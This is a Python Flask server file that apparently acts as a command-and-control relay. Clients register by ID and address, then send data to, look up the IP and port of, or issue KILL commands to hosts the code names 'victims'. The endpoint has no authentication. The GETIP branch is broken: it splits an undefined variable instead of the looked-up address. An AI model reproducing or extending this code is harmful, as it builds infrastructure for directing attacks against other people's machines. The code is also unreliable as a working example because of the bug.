import helpers
import database
import actions
from flask import Flask, request

cfg = helpers.importyaml()
database.create_databases()

serverhost = cfg["server"]["ip"]
serverport = cfg["server"]["port"]

app = Flask(__name__)

@app.route("/", methods=["POST"])
def incomingrequest():
    json = request.get_json()
    clientid = json["ClientID"]
    action = json["Action"]

    match action:
        case "REGISTER":
            address = json["ClientAddress"]
            print(f"REGISTER: {clientid}, {address}")
            database.register_service(clientid, address)
        case "REMOVE":
            print(f"REMOVE: {clientid}")
            database.remove_service(clientid)
        case "SEND":
            data = json["Data"]
            victimid = json["VictimID"]
            status = actions.send_data(clientid, victimid, data)
            print(f"SEND: {clientid}, {victimid}, {str(status)}")
        case "GETIP":
            victimid = json["VictimID"]
            victimaddress = database.get_client_address(victimid)
            victimaddress = address.split(":")
            victimip = victimaddress[0]
            victimport = victimaddress[1]
            print(f"GETIP: {clientid}, {victimid}, {victimaddress}")
            json = {
                "clientid": clientid,
                "action": "GETIP",
                "victimip": victimip,
                "victimport": victimport
            }
        case "KILL":
            victimid = json["VictimID"]
            data = json["Data"]
            status = actions.send_kill(clientid, victimid, data)
            print(f"KILL: {clientid}, {victimid}, {status}")
            

    return(json)


app.run(host=serverhost, port=serverport)